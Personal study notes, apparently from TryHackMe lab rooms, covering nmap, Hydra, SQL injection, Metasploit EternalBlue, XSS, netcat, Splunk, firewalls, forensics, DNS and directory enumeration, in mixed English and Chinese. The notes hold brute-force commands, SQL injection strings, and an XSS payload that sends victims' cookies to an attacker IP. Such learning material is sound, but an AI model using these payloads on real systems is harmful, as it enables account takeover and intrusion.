---
title: Security check
---


## View the pem


``openssl dhparam -in dhparams.pem -text -noout``
### check certificate

`openssl x509 -in cert.pem -text`



---
## Hash

`sha256sum order.json`

### HMAC

key + text
`openssl sha256 -hmac '3RfDFz82' order.txt`

### md5


`echo -n 'qwerty' | openssl md5`




## nmap





|                              |                                                                                                                      |
| ---------------------------- | -------------------------------------------------------------------------------------------------------------------- |
| `nmap -sV xxx.xxx`           | find server software, also find  os name<br>                                                                         |
| `nmap -T5 xxx.xxx`           | fast scan                                                                                                            |
| `nmap -sF xxx.xxx`           | FIN scan. a request is sent with FIN flag                                                                            |
| `nmap -sN xxx.xxx`           | NULL scan                                                                                                            |
| `nmap -sX xxx.xxx`           | xmas scan. send a malformed TCP packet and expect RST response for closed ports                                      |
| `nmap -sL xxx.xxx`           | only list the targets to scan without actually scanning them                                                         |
| `nmap -sn xxx.xxx`           | 进行ping扫描/主机发现，之检测网络中哪些主机是活动的，而不是扫描这些主机的端口                                                                            |
| `nmap -sT xxx.xxx`           | connect by three-way handshake TCP , to scan the port. If handshake is successful, then the scan shows the port open |
| `nmap -sV -p <port> xxx.xxx` | find what software is listening on that port                                                                         |
| `nmap -p- xxx.xxx`           | scan 1000 most-common ports. where you can find hidden service port                                                  |
| `nmap -Pn xxx.xxx`           | Ping down mode,`nmap -Pn -sV xxx.xxx`. nmap默认会先进行ping探测，如果没有受到TCP或ICMP响应就会认为主机down。所以可以尝试跳过ping探测                    |
| `nmap -sS xxx.xxx`<br>       | TCP SYN – only first step of the three-way handshake                                                                 |
| `nmap -sU xxx.xxx`           | UDP scan                                                                                                             |
| `nmap -F xxx.xxx`            | fast mode - scans the 100 most common ports                                                                          |
|                              |                                                                                                                      |
| `-O`                         | OS detection                                                                                                         |
| `-sV`                        | Service and version detection                                                                                        |
| `-A`                         | OS detection, version detection, and other additions                                                                 |
| `-Pn`                        | Scan hosts that appear to be down                                                                                    |


When executing under ROOT, use SYN scan by default
When executing not under root, use TCP scan by default

* `-T<level>`: 
	* -T0: most safe, slowest, "paranoid mode", a port is scanned every 5 minutes
	* -T3, normal mode, a port is scanned every one second, but still need 18 hours to scan all ports
	* -T5: "insane mode", fastest, scan a port every 5 milliseconds. Unsafe, the administrator will see a scan
* check what is going on while a scan is running: press F to see the status 

- 443：HTTPS（安全的HTTP）
- 21：FTP（文件传输协议）
- 22：SSH（安全外壳协议）
- 25：SMTP（简单邮件传输协议）
- 80：HTTP
- 53：DNS（域名系统）
- 110：POP3（邮局协议版本3）
- 143：IMAP（互联网消息访问协议）
- 3306：MySQL数据库
- 5432：PostgreSQL数据库


---

## Cron


```
* * * * * command_to_run
│ │ │ │ │
│ │ │ │ └── 星期几 (0 - 7) (0 和 7 代表周日)
│ │ │ └──── 月份 (1 - 12)
│ │ └────── 日期 (1 - 31)
│ └──────── 小时 (0 - 23)
└────────── 分钟 (0 - 59)
```



| command      | Description                                                          |
| :----------- | :------------------------------------------------------------------- |
| `crontab -l` | list all cron jobs<br>                                               |
| `crontab -r` | delete all cron jobs                                                 |
| `crontab -e` | edit all crontab jobs. Also here you can find what cron job you have |
|              |                                                                      |




---

## traceroute



| command | Description                  |
| :------ | :--------------------------- |
| `eth0`  | ethernet connection<br>      |
| `wlan0` | wireless internet connection |
| `lo`    | loop back                    |
| `tun0`  | vpn interface                |



---

## Hydra



`hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

1. use `nmap -sT ipxxx` to find what protocol the user is using . or using `nmap -p-`
2. for example if it is ssh, try `ssh alice@ipxxx` see if it is work
3. then use hydra find the password: `hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh`

**If in the "website" situation:**
after figure out which port should use : `http://xxx.xxx.xxx:portNumber` (for example: `http://10.10.241.123:2137`)
1. Open developer tool, check what protocol it is using:  here is using http-form-post
```
<form method="post" action="#">   
<label for="pass">Password</label><br>   
<input type="test" name="dms_pass"><br>   
<button type="submit">Open the door</button>   
</form>
```
	Also we can see  password name is actually dms_pass (focus on the "input")
2. use hydra: 
`hydra -l <username> -P <password_list> -s <port_number> -t 64 -f <host> <protocol> "/:<password-input-field>=^PASS^:wrong"`
	`<username>`: if no username, don't need to fill in, just ""
	`<password_list>`: the password list file
	`<port_number`: scan all port, find the port for this web
	-t 64: try 64 connections at once
	-f: stop once find the password
	`<host>`: the target IP address
	`<protocol>`: for example http-form-post
	`<password-input-filed>` : the name in the html form for the password input, for example in this case: dms_pass

if ftp: `hydra -l user -P passlist.txt ftp://MACHINE_IP`

There are a lot of ways you can send a password to a server: GET request, POST request, AJAX, more

beautiful

---


## SSH
only Rocky linux, ssh is sshd

| command                       | Description                                             |
| :---------------------------- | :------------------------------------------------------ |
| `sudo systemctl status sshd`  | check where ssh server is running<br>                   |
| `sudo systemctl stop sshd`    | stop ssh service (but will start again after reboot     |
| `sudo systemctl disable sshd` | disable ssh entirely, so won't start again after reboot |


---
## Wireshark
* find a certain name: in the display filter: `frame contains "xxx"`
* insensitve case(大小写忽视)`frame matches "(?i)xxx"`

```
File Transfer Protocol (FTP)
USER pasquale\r\n
Request command: USER
Request arg: pasquale
```
**Request arg is where the input value is**



---
## SQL Injection

* `SELECT username, admin FROM users WHERE username="pasquale" AND password="" OR 1;` (when "1", means the first user)
* `SELECT username, admin FROM users WHERE username="pasquale" AND password="" OR admin="1";` (admin="1" means log in as admin)

`--` : is comment

1. Input Box Non-String
	foe example `where profileID=10` -> `where profieID=1 or 1=1-- -`
2. Input Box String
	same as above, 注意这里的已经是被单引号包围的。just they will be a string `where profileID='1' or '1'='1'-- -`
3. URL injection
	在url中写入`http://10.10.201.205:5000/sesqli3/login?profileID=-1' or 1=1-- -&password=a` 重点在于`-1' or 1=1-- -&password=a`
	因为通常情况下profileID是一个正数，使用-1是一定不会匹配到有效值的，也就等于终止这个字符串，让后面的SQL代码得以插入。这里的一个单引号是补齐sql里面的，拼接后就是`profileID='-1'`
	`&password=a`是让整个请求的参数列表完整
	


`


---
## Splunk

create a new username : `index=main EventID=4720`

how to find what command used to add a backdoor user from a remote computer?
`index=main A1berto .exe` (put the fake backdoor user name here, and add .exe)
find the "Process Command Line"

Event ID for attempt login: 4625 (failed login) , 4624 (successful login)
how to search: `index=main A1berto 4624`

How many events were logged for the malicious PowerShell execution?
EventID 4103 通常出现在 **Microsoft-Windows-PowerShell/Operational** 日志中，代表的是 PowerShell 引擎记录的详细执行信息。
`index=main EventID=4103`



use [**CyberChef**](https://gchq.github.io/CyberChef/) to decode data: Drag "From Base64" and "Decode text" and choose encoding: "UTF-16LE(1200)"

Decode the PowerShell command which encoded by using Base64 （Base64是一种将二进制数据转换成由64个字符构成的可打印字符序列的过程，不是加密，只是把数据转换成另一种格式，使其能安全的在文本系统中传输）

After found the certain string, decode again
"Defang URL" make the URL non-clickable    [Reference](https://enescayvarli.medium.com/tryhackme-investigating-with-splunk-walkthrough-931448089)


---
## Metasploit
`msfconsole`

`ping -c 1 8.8.8.8` : `-c 1`for linux, means counting for one, so only send one packet to 8.8.8.8
`history`: see commands you typed earlier



`nmap -script vuln <ip_address>`: nmap运行其脚本引擎NSE中所有归类为“vuln"漏洞检测类别的脚本。自动检测常见漏洞安全风险等。


* Exploit: a piece of code that uses a vulnerability present on the target system
* Vulnerability: A design, coding or logic flaw affectinng the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
* Payload:  Payloads are the code that will run on the target system


* **Auxiliary**: Any supporting module, such as scanners, crawlers and fuzzers...
* **Encoders**: allow you to encode the exploit and payload in the hope that signature-based antivirus solution may miss them. limited success rate.本质上只是“重新编码”
* **Evasion**: 通过各种方法**主动**尝试绕过杀毒软件或安全防护的技术或模块。与 “Encoders” 相比，它的目标更明确，方法更复杂。属于更高级、直接针对安全检测机制的对抗手段。它可能包括反调试、动态加密、内存加载、利用白名单程序加载恶意模块等各种技巧，以**主动**绕过现代杀软、EDR 等更复杂的防护系统。
* **Exploit**：利用这些漏洞进行攻击的实际代码、脚本或方法，目的是触发漏洞并执行攻击操作，比如获取系统权限、泄露敏感数据或执行任意代码。
* NOPs: no operation; do nothing. TELL CPU will do nothing for one cycle.
* Payloads: codes that will run on the target system
	* Adapters: An adapter wraps single payloads to convert them into different formats. ( For example, a normal single payload can be wrapped inside a powershell adapter, which will make a single Powershell command execute the payload)
	* Singles: self-contained payload, do not need to download an additional component to run
	* Stagers: responsible for setting up a connection channel between Metasploit and the target system.
		* “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
	* Stages: Downloaded by the stager. This will allow you to use larger sized payloads
	> **inline payload**: use "\_" to connect `generic/shell_reverse_tcp`
	> **staged payload**: use "/" to connect `windows/x64/shell/reverse_tcp`
	> inline: 完整的一次性代码。staged(拆分成stager和stage)

* Post: Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.

主要目的：发现已知漏洞/vulnerability是否在目标machine上存在
**The exploitation process comprises three main steps; 
1. **finding the exploit **
2. **customizing the exploit**
3. **exploiting the vulnerable service.**

输入`msfconsole`启动，
使用一个名为`ms17_010_eternalblue`的漏洞模块：`use exploit/windows/smb/ms17_010_eternalblue`


`show options`：显示当前所选模块所需的可配置参数以及它们的默认值等等。当设置了xxx后再用一次show options可以看到当前设置的参数。这里显示的就是payload

`unset payload`：清掉所有的payload，就是在show options执行后的parameters；里面的payload一栏
> 注意有些exploit就算没有手动设置payload，metasploit会自动选择一个默认的payload，用`show advanced`可以看到

`show payloads`：列出当前所选漏洞exploit可使用的所有有效payload。也就是看哪些payload与该exploit兼容。payload是发送到目标系统的可执行代码。其中包含执行特定命令或恶意代码。

after enter the certain 漏洞：
1. 设置target host: `set rhosts 10.10.224.36`
* **`RHOSTS`:** “Remote host”, the IP address of the target system. A single IP address or a network range can be set. This will support the CIDR (Classless Inter-Domain Routing) notation (/24, /16, etc.) or a network range (10.10.10.x – 10.10.10.y). You can also use a file where targets are listed, one target per line using file:/path/of/the/target_file.txt, as you can see below.
- **`RPORT`:** “Remote port”, the port on the target system the vulnerable application is running on.
- **`PAYLOAD`:** The payload you will use with the exploit.
- **`LHOST`:** “Localhost”, the attacking machine (your AttackBox or Kali Linux) IP address.
- **`LPORT`:** “Local port”, the port you will use for the reverse shell to connect back to. This is a port on your attacking machine, and you can set it to any port not used by any other application.
- **`SESSION`:** Each connection established to the target system using Metasploit will have a session ID. You will use this with post-exploitation modules that will connect to the target system using an existing connection.


`setg`: set values that will be used for all modules (set global)

The `exploit` command can be used without any parameters or using the “`-z`” parameter.
The `exploit -z` command will run the exploit and background the session as soon as it opens.

use `check` command to check if the target system is vulnerable to this. （是否有这个漏洞/vulnerability）

**Meterpreter**： 允许在target machine 上执行命令，提供类似shell的交互。in-memory / 内存驻留，不会在target machine的disk上直接生成一个可知性文件，减少被杀毒软件和取证检测到的风险。可以文件系统浏览，进程管理，等等别的。可扩展。


to interact with any session: `sessions -i x` 比如`sessions -i 1`。执行这个命令后，metasploit会切换到这个session的控制台，你就可以在该target machine的Meterpreter绘画中执行各种命令了


例子：
```shell-session
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg rhosts 10.10.165.39
rhosts => 10.10.165.39
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > use auxiliary/scanner/smb/smb_ms17_010 
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
```
---
## XSS

basically you inject into javascript
* XSS payloads
* Reflected XSS: parameters in the URL Query String ; URL File Path ; sometimes HTTP headers
* Stored XSS: the XSS payload stored on the web application (for example database) and then gets run when other users visit the web page or site.
	* the malicious Javascript could redirect users to another site, steal user's session cookie or perform other website actions while acting as the visiting users.
	* commnets on blog ; user profile informaiton; website listings
* Blind XSS: similar to stored XSS, but you can't see the payload working or be able to test it against yourself first
	* how to test: ensure you payload has a call back( usually an HTTP request)
	* popular tool is xsshunter. this tool will automatically capture cookies, URLs , page contents and more




---
## netcat

listening server using Netcat

`-nlvp`:
- **-n**：不进行 DNS 解析，直接使用数字 IP 地址。
- **-l**：进入监听模式，让 netcat 作为服务器等待连接。
- **-v**：启用详细模式，显示更多执行过程的信息。
- **-p**：指定监听或连接的端口号。

`</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>`

* The `</textarea>` tag closes the textarea field. 
* The `<script>`tag opens open an area for us to write JavaScript.
* The `fetch()` command makes an HTTP request.
* `{URL_OR_IP}` is either the THM request catcher URL or your IP address from the THM AttackBox or your IP address on the THM VPN Network.
* `?cookie=` is the query string that will contain the victim's cookies.
* `btoa()` command base64 encodes the victim's cookies.
* `document.cookie` accesses the victim's cookies for the Acme IT Support Website.
* `</script>`closes the JavaScript code block.


example:
`</textarea><script>fetch('http://10.10.248.113:9001?cookie=' + btoa(document.cookie) );</script>
`
* IP address is the attacker machine
* also specify the port number. (which you set up by using `nc -nlvp 9001`)






---
## Firewall
* Stateless Firewall: 基于预设的规则检查每个数据包的基本属性（例如IP地址，端口，协议等），不考虑数据包之间的关系
* Stateful Firewall: 除了检查基本属性外，还会维护连接状态信息，跟踪数据包在一次完整会话中的状态，从而判断数据包是否符合正常的通信流程。假设防火墙根据其规则接受了几个来自源地址的数据包。在这种情况下，防火墙会在其声明表中记录下这一连接，并允许这一连接的所有未来数据包自动获得允许，而无需检查每个数据包。同样，有状态防火墙会记录下拒绝接受几个数据包的连接，并根据这一信息拒绝接受来自同一来源的所有后续数据包。
* proxy firewall: Proxy firewalls, or application-level gateways, act as intermediaries between the private network and the Internet and operate on the OSI model’s layer 7. They inspect the content of all packets as well.

### Tools:
#### ufw
`sudo ufw status`: check ufw status
`sudo ufw enable`: enable ufw. use `disable` to disable the firewall
`sudo ufw default allow outgoing`: allow all the outgoing connections . incoming is `incoming`
`sudo ufw deny 22/tcp`: block incoming SSH traffic. First specify the action, the specify the port and transport protocol
`sudo ufw status numbered`: list down all the active rules in a numbered order
`sudo ufw delete 2`: delete the rule (according to the number)


#### Netfilter

Netfilter is the framework inside the Linux OS with core firewall functionalities, including packet filtering, NAT, and connection tracking. This framework serves as the foundation for various firewall utilities available in Linux to control network traffic. Some common firewall utilities that utilize this framework are listed below:

- **iptables:** This is the most widely used utility in many Linux distributions. It uses the Netfilter framework that provides various functionalities to control network traffic.
- **nftables:** It is a successor to the “iptables” utility, with enhanced packet filtering and NAT capabilities. It is also based on the Netfilter framework.
- **firewalld:** This utility also operates on the Netfilter framework and has predefined rule sets. It works differently from the others and comes with different pre-built network zone configurations.

---
## SIEM
Security Information and Event Management system
Tools: Splunk, and others

**1) Host-Centric Log Sources**

These are log sources that capture events that occurred within or related to the host. Some log sources that generate host-centric logs are Windows Event logs, Sysmon, Osquery, etc. Some examples of host-centric logs are:
- A user accessing a file
- A user attempting to authenticate.
- A process Execution Activity
- A process adding/editing/deleting a registry key or value.
- Powershell execution

**2) Network-Centric Log Sources**
Network-related logs are generated when the hosts communicate with each other or access the internet to visit a website. Some network-based protocols are SSH, VPN, HTTP/s, FTP, etc. Examples of such events are:
- SSH connection
- A file being accessed via FTP
- Web traffic
- A user accessing company's resources through VPN.
- Network file sharing Activity





---
## Digital Forensic


- **Disk image:** The disk image contains all the data present on the storage device of the system (HDD, SSD, etc.). This data is non-volatile, meaning that the disk data would survive even after a restart of the operating system. For example, all the files like media, documents, internet browsing history, and more.
    
- **Memory image:** The memory image contains the data inside the operating system’s RAM. This memory is volatile, meaning the data will get lost after the system is powered off or restarted. For example, to capture open files, running processes, current network connections, etc., the memory image should be prioritized and taken first from the suspect’s operating system; otherwise, any restart or shutdown of the system would result in all the volatile data getting deleted. While carrying out digital forensics on a Windows operating system, disk and memory images are very important to collect.

tools:
**FTK Imager**: taking disk images of Windows operating systems

**Autopsy**: An investigator can import an acquired disk image into this tool, and the tool will conduct an extensive analysis of the image.

**DumpIt**: taking a memory image from a Windows operating system. This tool creates memory images using a command-line interface and a few commands. The memory image can also be taken in different formats.

**Volatility:** [Volatility](https://volatilityfoundation.org/) is a powerful open-source tool for analyzing memory images. It offers some extremely useful plugins. Each artifact can be analyzed using a specific plugin. This tool supports various operating systems, including Windows, Linux, macOS, and Android.





---
## Burp

- **Proxy**: enables interception and modification of requests and responses while interacting with web applications.
- **Repeater**:  [Repeater](https://tryhackme.com/room/burpsuiterepeater) allows for capturing, modifying, and resending the same request multiple times. This functionality is particularly useful when crafting payloads through trial and error (e.g., in SQL Injection) or testing the functionality of an endpoint for vulnerabilities.
- **Intruder**:  [Intruder](https://tryhackme.com/room/burpsuiteintruder) allows for spraying endpoints with requests. It is commonly utilized for brute-force attacks or fuzzing endpoints.
- **Decoder**: [Decoder](https://tryhackme.com/room/burpsuiteom) offers a valuable service for data transformation. It can decode captured information or encode payloads before sending them to the target. While alternative services exist for this purpose, leveraging Decoder within Burp Suite can be highly efficient.
- **Comparer**: [Comparer](https://tryhackme.com/room/burpsuiteom) enables the comparison of two pieces of data at either the word or byte level. While not exclusive to Burp Suite, the ability to send potentially large data segments directly to a comparison tool with a single keyboard shortcut significantly accelerates the process.
- **Sequencer**: [Sequencer](https://tryhackme.com/room/burpsuiteom) is typically employed when assessing the randomness of tokens, such as session cookie values or other supposedly randomly generated data. If the algorithm used for generating these values lacks secure randomness, it can expose avenues for devastating attacks.


---
## Subdomain
`site:*.domain.com -site:www.domain.com` : 
`site:*.domain.com` google只显示来自domain.com的所有索引页面
`-site:www.domain.com` : 把`www.domain.com` 排除在搜索结果之外，从而来挖掘其他子域名



---
## DNS
- **A record**: The A (Address) record maps a hostname to one or more IPv4 addresses. For example, you can set `example.com` to resolve to `172.17.2.172`.
- **AAAA Record**: The AAAA record is similar to the A Record, but it is for IPv6. Remember that it is AAAA (quad-A), as AA and AAA would refer to a battery size; furthermore, AAA refers to _Authentication, Authorization, and Accounting_; neither falls under DNS.
- **CNAME Record**: The CNAME (Canonical Name) record maps a domain name to another domain name. For example, `www.example.com` can be mapped to `example.com` or even to `example.org`.
- **MX Record**: The MX (Mail Exchange) record specifies the mail server responsible for handling emails for a domain.
- TXT record
- NS record
- PTR Record：pointer记录，在reverse-lookup中，IP 地址会被反向排列后 附加上特定的域名后缀（IPv4 通常使用 `.in-addr.arpa`，IPv6 使用 `.ip6.arpa`）。当你发起反向查找请求时，DNS 查询的是对应反向区域中的 PTR 记录，从而得到该 IP 地址所对应的域名（如果有配置）
	`dig -x <IP地址>`


In other words, when you type `example.com` in your browser, your browser tries to resolve this domain name by querying the DNS server for the A record. However, when you try to send an email to `test@example.com`, the mail server would query the DNS server to find the MX record.



`nslookup`： loop up the ip address of a domain from the command line
`nslookup -type=txt youtube.com`: (Windows) query a txt record for 'youtube.com'
`dig facebook.com txt`: (Linux) query a txt record for 'facebook.com'

Query a txt record 就是查询某个域名所设置的txt 记录，在域名配置和故障排查中很常见

`whois`： 注册域名需要注册人的联系方式，姓名邮箱电话等，这些都是记录在WHOIS数据库中，默认公开。如果不想公开也可以使用privacy service，则不会在WHOIS中直接显示个人信息



---
## ONIST

### **Google Hacking / Dorking**

Google hacking / Dorking utilizes Google's advanced search engine features, which allow you to pick out custom content. You can, for instance, pick out results from a certain domain name using the **site:** filter, for example (site:[tryhackme.com](http://tryhackme.com)) you can then match this up with certain search terms, say, for example, the word admin (site:tryhackme.com admin) this then would only return results from the [tryhackme.com](http://tryhackme.com) website which contain the word admin in its content. You can combine multiple filters as well. Here is an example of more filters you can use:

| **Filter** | **Example**        | **Description**                                              |
| ---------- | ------------------ | ------------------------------------------------------------ |
| site       | site:tryhackme.com | returns results only from the specified website address      |
| inurl      | inurl:admin        | returns results that have the specified word in the URL      |
| filetype   | filetype:pdf       | returns results which are a particular file extension        |
| intitle    | intitle:admin      | returns results that contain the specified word in the title |
### **Wappalyzer**

Wappalyzer ([https://www.wappalyzer.com/](https://www.wappalyzer.com/)) is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.


### **Wayback Machine**

The Wayback Machine ([https://archive.org/web/](https://archive.org/web/)) is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website

### **S3 Buckets**

S3 Buckets are a storage service provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private and even writable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn't be available to the public. 一个桶，是亚马逊提供的云存储服务，有时候开发者不小心把权限配置错误，会导致任何人都能访问到原本私有的文件。misconfiguration

The format of the S3 buckets is http(s)://**{name}.**[**s3.amazonaws.com**](http://s3.amazonaws.com/) where {name} is decided by the owner, such as [tryhackme-assets.s3.amazonaws.com](http://tryhackme-assets.s3.amazonaws.com). 

S3 buckets can be discovered in many ways, such as finding the URLs in the website's page source, GitHub repositories, or even automating the process. One common automation method is by using the company name followed by common terms such as **{name}**-assets, **{name}**-www, **{name}**-public, **{name}**-private, etc.



### **What is Automated Discovery?**

Automated discovery is the process of using tools to discover content rather than doing it manually. This process is automated as it usually contains hundreds, thousands or even millions of requests to a web server. These requests check whether a file or directory exists on a website, giving us access to resources we didn't previously know existed. This process is made possible by using a resource called wordlists.

  

### **What are wordlists?**

Wordlists are just text files that contain a long list of commonly used words; they can cover many different use cases. For example, a password wordlist would include the most frequently used passwords, whereas we're looking for content in our case, so we'd require a list containing the most commonly used directory and file names. An excellent resource for wordlists that is preinstalled on the THM AttackBox is [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) which Daniel Miessler curates.

  
### **Automation Tools**

Although there are many different content discovery tools available, all with their features and flaws, we're going to cover three which are preinstalled on our attack box, ffuf, dirb and gobuster.


对目标网站或web服务做directory/file enumeration。也就是尝试去找到目标服务器上可能隐藏或没有公开连接的目录，文件，接口等
其结合一个字典(wordlist)批量尝试URL路径，从而快速发现哪些目录或文件是真实存在的
> 例如：
>1. 从字典里读取一条路径（例如 `admin`），拼接成 `http://目标IP/admin`，然后发送请求；
>2. 根据返回的状态码（200、403、404 等）或响应大小，判断这个路径是否存在；
>3. 如果状态码是 200 或者响应大小很大，往往说明是个有效目录或文件；
>4. 工具会记录下所有“可能存在”的路径，最后输出一个列表，让你知道在服务器上可能有什么隐藏入口。

- **潜在的管理界面**（如 `/admin`、`/login`）、
- **敏感文件**（比如 `.git/`, `backup.zip`, `config.php.bak`），
- **API 接口**（如 `/api/v1/`），
简单说，扫描结果能告诉你：
- “哦，原来这个网站还有 `http://10.10.179.163/secret/` 这个路径，但在页面里看不到任何链接。”
- “居然有 `/admin/login` 这样一个后台登录接口，我可以进一步试试弱口令。”


**Using ffuf:**
`user@machine$ ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.179.163/FUZZ`

`ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.219.148`
. The **-H** switch adds/edits a header (in this instance, the Host header)
**FUZZ** keyword in the space where a subdomain would normally go, and this is where we will try all the options from the wordlist.


**Using dirb:**
`user@machine$ dirb http://10.10.179.163/ /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt`

**Using Gobuster:**
`user@machine$ gobuster dir --url http://10.10.179.163/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt`








